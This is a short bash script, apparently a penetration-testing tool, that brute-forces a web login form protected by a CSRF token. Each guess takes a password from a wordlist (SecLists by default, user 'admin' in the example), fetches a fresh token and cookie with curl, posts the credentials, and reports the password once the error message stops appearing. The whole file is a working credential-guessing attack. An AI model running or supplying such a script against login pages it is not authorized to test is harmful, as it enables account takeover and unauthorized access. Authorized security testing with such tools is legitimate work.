#!/bin/bash
#
# Tests forms with CSRF token
#

# Example
#formpage="http://mypage.com/login/index.php"
#token_tag="token"
#passwd_tag="pass"
#otherdata="user=admin&submit=Send"
#filename="/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt"
#error_msg="Incorrect user or password" 

# Usage
if [ -z "${6}" ]
then
	echo "Usage: $0 form_page token_tag passsword_tag other_post_data password_file error_message"
	echo " "
	echo "Example:"
	echo "$0 http://mypage.com/login/index.php token pass 'user=admin&submit=Send' '/usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt' 'Incorrect user or password'"
	exit
fi

formpage="$1"
token_tag="$2"
passwd_tag="$3"
otherdata="$4"
filename="$5"
error_msg="$6"

while read line
do
	passwd=$line

	# Change this line to correctly extract your token (awk)
	token=$(curl -s -c cookies.txt "${formpage}" | grep "$token_tag" | awk 'BEGIN { FS="\""} {print $6}')

	output=$(curl -s -b cookies.txt "${formpage}" --data-raw "${passwd_tag}=${passwd}&${token_tag}=${token}&${otherdata}")

	if [[ "$output" =~ "$error_msg" ]]
	then
		echo -n "."
	else
		echo ""
		echo ">>> FOUND!! $passwd"
		exit
	fi

done < $filename

rm cookies.txt

